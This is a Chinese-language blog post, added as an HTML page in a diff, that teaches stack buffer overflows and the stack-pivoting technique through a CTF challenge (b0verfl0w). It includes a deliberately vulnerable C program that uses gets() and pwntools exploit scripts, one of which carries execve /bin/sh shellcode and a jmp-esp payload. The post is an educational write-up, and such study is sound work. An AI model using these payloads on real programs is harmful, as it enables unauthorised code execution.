@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言pwn很爽，一时pwn一时爽，时时pwn时时爽。 stackoverflowstackoverflow的条件是：  输入点（可往栈上写入数据） 溢出点（存在危险函数，且写入的空间没有被良好控制）  basic123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success()&amp;#123;puts(&amp;quot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stackoverflow之stack-pivoting">
+<meta property="og:url" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="前言pwn很爽，一时pwn一时爽，时时pwn时时爽。 stackoverflowstackoverflow的条件是：  输入点（可往栈上写入数据） 溢出点（存在危险函数，且写入的空间没有被良好控制）  basic123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success()&amp;#123;puts(&amp;quot">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126120513865.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126121146934.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126121355095.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126124720163.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126140258699.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126143547993.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126144500873.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126151137150.png">
+<meta property="article:published_time" content="2019-11-26T02:06:13.000Z">
+<meta property="article:modified_time" content="2019-11-26T07:40:17.842Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126120513865.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>stackoverflow之stack-pivoting</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/stackoverflow%E4%B9%8Bret2text/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/%E7%AE%80%E5%8D%95%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&text=stackoverflow之stack-pivoting"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&is_video=false&description=stackoverflow之stack-pivoting"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=stackoverflow之stack-pivoting&body=Check out this article: https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&name=stackoverflow之stack-pivoting&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&t=stackoverflow之stack-pivoting"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stackoverflow"><span class="toc-number">2.</span> <span class="toc-text">stackoverflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#basic"><span class="toc-number">3.</span> <span class="toc-text">basic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-pivoting"><span class="toc-number">4.</span> <span class="toc-text">stack-pivoting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        stackoverflow之stack-pivoting
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-26T02:06:13.000Z" itemprop="datePublished">2019-11-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>pwn很爽，一时pwn一时爽，时时pwn时时爽。</p>
+<h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><p>stackoverflow的条件是：</p>
+<ul>
+<li>输入点（可往栈上写入数据）</li>
+<li>溢出点（存在危险函数，且写入的空间没有被良好控制）</li>
+</ul>
+<h2 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success()&#123;puts(&quot;You Hava already controlled it.&quot;);&#125;</span><br><span class="line">void vulnerable()&#123;</span><br><span class="line">	char s[12];</span><br><span class="line">	gets(s);</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc,char **argv)&#123;</span><br><span class="line">	vulnerable();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该binary满足stackoverflow的条件，调用危险函数gets,往栈上的s[12]写入数据，同时没有控制写入空间。</p>
+<p>stackoverflow最基础的利用方式就是劫持EIP到特定的函数，从而改变程序的执行流程，例如在本题中劫持到success函数。</p>
+<p>如何劫持EIP到success函数？填满缓冲区，然后填入success函数的地址。</p>
+<p>如何计算出缓冲区大小？如何找到success函数的地址？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d stackoverflow -M intel | grep -C 30 &quot;&lt;main&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这条命令是使用objdump将stackoverflow反编译成intel语法的汇编代码，同时过滤出来main函数的前后30行。</p>
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126120513865.png" alt="image-20191126120513865"></p>
+<p>由此即可构造出来payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;\x90&#x27;*offset+success_addr</span><br></pre></td></tr></table></figure>
+
+<p>在写exploit前，需要确定binary是32位还是64位。</p>
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126121146934.png" alt="image-20191126121146934"></p>
+<p>所有的条件都已经具备，下面为exploit：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./stackoverflow&#x27;)</span><br><span class="line">offset = 0x14+4</span><br><span class="line">addr = 0x804843b</span><br><span class="line">payload = &#x27;\x90&#x27;*offset + p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126121355095.png" alt="image-20191126121355095"></p>
+<h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack-pivoting"></a>stack-pivoting</h2><p>stack-pivoting也叫堆栈旋转。</p>
+<p>以X-CTF-Quals-2016-b0verfl0w 为例：</p>
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126124720163.png" alt="image-20191126124720163"></p>
+<p>binary中没有后门函数，利用思路是将shellcode写入栈中，然后劫持EIP到shellcode地址。</p>
+<p>那么shellcode写入到栈中哪里好呢？一个很好的位置就是[ebp-20h],即伪代码中的s位置。</p>
+<p>当将shellcode写入到[ebp-20h]中后，接下来就是如何劫持EIP到[ebp-20h]地址，利用的想法是stack-pivoting。</p>
+<p>下图为stack-pivoting的payload在内存中的分布：</p>
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126140258699.png" alt="image-20191126140258699"></p>
+<p>这段payload是往内存中依次填充<code>shellcode\ebp\jmp_esp_addr\asm(sub esp,offset;jmp esp)</code>，</p>
+<p>当binary被触发执行后，控制流会在原栈帧的基础上，进行旋转执行，如下图所示：</p>
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126143547993.png" alt="image-20191126143547993"></p>
+<p>stack-pivoting的实现关键在于jmp_esp_addr的寻找和offset的计算。</p>
+<p>此处jmp_esp_addr的特点正如命名，一个可以直接跳转到esp的ROP gadgets的地址，可以利用ROPgadget工具寻找：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary b0verfl0w --only &#x27;jmp|ret&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126144500873.png" alt="image-20191126144500873"></p>
+<p>jmp_esp_addr&#x3D;0x08048504。</p>
+<p>而offset涉及到EIP是否可以旋转回到原ESP地址即shellcode的位置，故offset的计算应该为：</p>
+<p>offset&#x3D;len(shellcode)+len(ebp)+len(jmp_esp_addr)</p>
+<p>然而由于可写入的地址空间为0x20&#x3D;32个字节，故shellcode的长度必需要尽量精短，满足在32个字节以内，故offset的计算为：</p>
+<p>offset&#x3D;0x20+len(ebp)+len(jmp_esp_addr)&#x3D;0x20+4+4&#x3D;0x28（binary为32位）</p>
+<p>由此，exploit为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./b0verfl0w&#x27;)</span><br><span class="line">shellcode= &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">print len(shellcode)</span><br><span class="line">jmp2esp = 0x08048504</span><br><span class="line">#0x28=0x20+4+4</span><br><span class="line">sub_esp_jmp = asm(&#x27;sub esp,0x28;jmp esp&#x27;)</span><br><span class="line">payload = shellcode+(0x20-len(shellcode))*&#x27;\x90&#x27;+&#x27;\x90&#x27;*4+p32(jmp2esp)+sub_esp_jmp</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bstack-pivoting/image-20191126151137150.png" alt="image-20191126151137150"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>github-ctf-wiki</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stackoverflow"><span class="toc-number">2.</span> <span class="toc-text">stackoverflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#basic"><span class="toc-number">3.</span> <span class="toc-text">basic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-pivoting"><span class="toc-number">4.</span> <span class="toc-text">stack-pivoting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&text=stackoverflow之stack-pivoting"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&is_video=false&description=stackoverflow之stack-pivoting"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=stackoverflow之stack-pivoting&body=Check out this article: https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&title=stackoverflow之stack-pivoting"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&name=stackoverflow之stack-pivoting&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bstack-pivoting/&t=stackoverflow之stack-pivoting"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Rj45mp
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
